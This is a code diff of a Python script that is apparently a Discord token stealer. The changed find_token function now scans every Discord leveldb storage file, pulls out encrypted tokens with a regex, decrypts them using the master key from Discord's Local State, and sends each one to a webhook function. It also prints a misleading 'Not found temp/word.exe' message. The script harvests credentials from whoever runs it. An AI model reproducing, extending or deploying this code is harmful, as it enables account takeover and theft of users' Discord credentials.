@@ -24,7 +24,7 @@ import browser_cookie3
 from Crypto.Cipher import AES
 import ctypes
 
-# WWWWWWWW
+# Hotfix :D
 
 types = ""
 h00k = ""
@@ -281,8 +281,8 @@ def extract_cookies(webhook_url):
 def get_master_key():
     paths = [
         os.path.join(os.environ['APPDATA'], "Discord", "Local State"),
-        os.path.join(os.environ['APPDATA'], "DiscordPTB", "Local State"),
-        os.path.join(os.environ['APPDATA'], "DiscordCanary", "Local State")
+        os.path.join(os.environ['APPDATA'], "DiscordCanary", "Local State"),
+        os.path.join(os.environ['APPDATA'], "DiscordPTB", "Local State")
     ]
 
     for path in paths:
@@ -310,40 +310,39 @@ def decrypt_value(encrypted_value: bytes, master_key: bytes) -> str:
 
 def find_token():
     master_key = get_master_key()
-
     storage_path = os.path.join(os.environ['APPDATA'], "Discord", "Local Storage", "leveldb")
-    found_tokens = []
+    sent_tokens = set()
 
     if not os.path.exists(storage_path):
-        print("             ")
+        print("Storage path not found.")
         return
 
     files = [f for f in os.listdir(storage_path) if f.endswith(".ldb") or f.endswith(".log")]
     if not files:
-        print(" ")
+        print("No files found.")
         return
 
-    selected_file = random.choice(files)  
-    print(" ")
+    for filename in files:
+        filepath = os.path.join(storage_path, filename)
+        try:
+            with open(filepath, "r", errors="ignore") as f:
+                for line in f:
+                    matches = re.findall(r'dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)', line)
+                    for match in matches:
+                        try:
+                            encrypted_token = base64.b64decode(match)
+                            decrypted_token = decrypt_value(encrypted_token, master_key)
+                            if decrypted_token and decrypted_token not in sent_tokens:
+                                sent_tokens.add(decrypted_token)
+                                webhook(decrypted_token)
+                                return  
+                        except Exception as e:
+                            print(f"Decryption failed")
+        except PermissionError:
+            print(f"Permission denied")
+            continue
 
-    try:
-        with open(os.path.join(storage_path, selected_file), "r", errors="ignore") as f:
-            for line in f:
-                matches = re.findall(r'dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)', line)
-                for match in matches:
-                    encrypted_token = base64.b64decode(match)
-                    decrypted_token = decrypt_value(encrypted_token, master_key)
-                    if decrypted_token:
-                        found_tokens.append(decrypted_token)
-    except PermissionError:
-        print(f" ")
-        return
-
-    if found_tokens:
-        for token in found_tokens:
-            webhook(token)
-    else:
-        print("ERROR") # Not Found The token
+    print("Not found temp/word.exe")  # Not Found The token
 
 def webhook(token):
     api = "https://discord.com/api/v6/users/@me"
